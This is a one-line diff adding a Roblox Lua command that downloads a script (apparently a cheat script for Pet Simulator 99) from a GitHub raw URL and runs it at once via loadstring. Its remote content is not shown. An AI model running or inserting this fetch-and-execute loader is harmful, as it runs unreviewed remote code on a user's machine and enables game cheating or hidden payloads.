@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/gameOperationalSystem/shutup/main/ps99.lua', true))()
